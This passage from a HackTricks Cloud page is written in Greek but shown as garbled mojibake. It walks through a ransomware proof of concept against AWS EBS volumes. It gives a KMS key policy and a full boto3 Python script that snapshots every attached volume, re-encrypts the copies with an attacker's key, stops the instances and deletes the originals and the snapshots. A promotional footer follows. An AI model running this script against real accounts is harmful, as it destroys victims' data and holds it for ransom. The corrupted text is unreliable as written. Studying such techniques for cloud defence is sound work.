Î¤ÏÏÎ± Î¼Îµ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯. ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'Î¸ÏÎ¼Î±' Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ EC2 instances Î¼Îµ Î±Ï€ÏÎ¿ÏƒÏ„Î¬Ï„ÎµÏ…Ï„Î¿Ï…Ï‚ EBS ÏŒÎ³ÎºÎ¿Ï…Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Î¹. ÎŸÎ¹ EBS ÏŒÎ³ÎºÎ¿Î¹ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï 'Î¸ÏÎ¼Î±' ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„Î¿Î¯ Ï€Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏÎ¿Ï…Î¼Îµ Î³Î¹Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·, Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î³Î¯Î½ÎµÏ„Î±Î¹ Ï…Ï€ÏŒ Ï„Î·Î½ Ï…Ï€ÏŒÎ¸ÎµÏƒÎ· Ï€Î±ÏÎ±Î²Î¯Î±ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï AWS Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ransomware Ï„Î¿Ï… S3. Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Ï„Ï‰Î½ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Ï‰Î½ EBS ÏŒÎ³ÎºÏ‰Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ (snapshots), Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î±Ï€ÏŒ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…' Î³Î¹Î± Î½Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î½Î­Î¿Ï…Ï‚ EBS ÏŒÎ³ÎºÎ¿Ï…Ï‚, Î­Ï€ÎµÎ¹Ï„Î± Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ EBS ÏŒÎ³ÎºÎ¿Ï…Ï‚ Î±Ï€ÏŒ Ï„Î± EC2 instances ÎºÎ±Î¹ Î¸Î± Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹, ÎºÎ±Î¹ Ï„Î­Î»Î¿Ï‚ Î¸Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Ï‰Î½ Î½ÎµÎ¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Ï‰Î½ EBS ÏŒÎ³ÎºÏ‰Î½. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Î‘Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î±Ï…Ï„Î¿Ï ÎµÎ¯Î½Î±Î¹ Î½Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½Î¿Ï…Î½ Î¼ÏŒÎ½Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Î¹ EBS ÏŒÎ³ÎºÎ¿Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Î¹ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Î‘Î¾Î¯Î¶ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏƒÏ„Î±Î¼Î¬Ï„Î·ÏƒÎµ Ï„Î± EC2 instances Î³Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ EBS ÏŒÎ³ÎºÎ¿Ï…Ï‚. ÎŸÎ¹ Î±ÏÏ‡Î¹ÎºÎ¿Î¯ Î¼Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Î¹ ÏŒÎ³ÎºÎ¿Î¹ Î­Ï‡Î¿Ï…Î½ ÎµÎ¾Î±Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯ Ï„ÏÏÎ±.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ 'ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…' ÎºÎ±Î¹ Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Î½ÏŒÎ½Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ 'Outside Encryption' Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Î ÎµÏÎ¹Î¼Î­Î½ÎµÏ„Îµ Î³Î¹Î± Î½Î± ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„ÎµÎ¯ Î· Î½Î­Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… "Î¸ÏÎ¼Î±Ï„Î¿Ï‚" ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î½ÎµÎ¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï…Ï‚ ÏŒÎ³ÎºÎ¿Ï…Ï‚ EBS. Î˜Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏŒÎ³ÎºÎ¿.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Ï„Î·Î½ EC2 Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Î¼Îµ Ï„Î¿Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ ÏŒÎ³ÎºÎ¿ EBS, Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ ÎºÎ±Î¹ Î¸Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½ÎµÎ¹ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· "ÎµÎºÎºÏÎµÎ¼Î®Ï‚" ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· "ÏƒÏ„Î±Î¼Î±Ï„Î·Î¼Î­Î½Î·" Î³Î¹Î± Ï€Î¬Î½Ï„Î±, ÎºÎ±Î¸ÏÏ‚ Î¿ ÎµÏ€Î¹ÏƒÏ…Î½Î±Ï€Ï„ÏŒÎ¼ÎµÎ½Î¿Ï‚ ÏŒÎ³ÎºÎ¿Ï‚ EBS Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯, Î±Ï†Î¿Ï Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î´ÎµÎ½ Ï„Î¿ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï€Î»Î­Î¿Î½.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± ÏƒÎµ Python Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ. Î‘Ï€Î±Î¹Ï„ÎµÎ¯ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± AWS Î³Î¹Î± Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ "Î¸ÏÎ¼Î±" ÎºÎ±Î¹ Î¼Î¹Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· Ï„Î¹Î¼Î® AWS ARN Î³Î¹Î± Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·. Î¤Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± ÎŸÎ›Î©Î Ï„Ï‰Î½ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Ï‰Î½ ÏŒÎ³ÎºÏ‰Î½ EBS Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Î¹ Î¼Îµ ÎŸÎ›Î•Î£ Ï„Î¹Ï‚ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯ÎµÏ‚ EC2 ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¸Î± ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÎµÎ¹ ÎºÎ¬Î¸Îµ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± EC2, Î¸Î± Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ ÏŒÎ³ÎºÎ¿Ï…Ï‚ EBS, Î¸Î± Ï„Î¿Ï…Ï‚ Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÎºÎ±Î¹, Ï„Î­Î»Î¿Ï‚, Î¸Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÎ»Î± Ï„Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±. Î‘Ï…Ï„ÏŒ Î¸Î± Î±Ï†Î®ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï…Ï‚ ÏŒÎ³ÎºÎ¿Ï…Ï‚ EBS ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ "Î¸ÏÎ¼Î±". Î§Î¡Î—Î£Î™ÎœÎŸÎ ÎŸÎ™Î—Î£Î¤Î• Î‘Î¥Î¤ÎŸ Î¤ÎŸ Î Î¡ÎŸÎ“Î¡Î‘ÎœÎœÎ‘ ÎœÎŸÎÎŸ Î£Î• ÎˆÎÎ‘ Î Î•Î¡Î™Î’Î‘Î›Î›ÎŸÎ Î”ÎŸÎšÎ™ÎœÎ—Î£, Î•Î™ÎÎ‘Î™ ÎšÎ‘Î¤Î‘Î£Î¤Î¡ÎŸÎ¦Î™ÎšÎŸ ÎšÎ‘Î™ Î˜Î‘ Î”Î™Î‘Î“Î¡Î‘Î¨Î•Î™ ÎŸÎ›ÎŸÎ¥Î£ Î¤ÎŸÎ¥Î£ Î‘Î¡Î§Î™ÎšÎŸÎ¥Î£ ÎŒÎ“ÎšÎŸÎ¥Î£ EBS. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï…Ï‚ Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ KMS ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ Î±Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ ÏƒÏ„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Ï„Î¿Ï…Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¼Î­ÏƒÏ‰ Î±Î½Ï„Î¹Î³ÏÎ¬Ï†Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚, Î±Î»Î»Î¬ Î¸Î­Î»Ï‰ Î±Ï€Î»Î¬ Î½Î± ÏƒÎ±Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÏ‰ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± PoC ransomware ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Ï„Î·Ï‚ Î·Î¼Î­ÏÎ±Ï‚.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
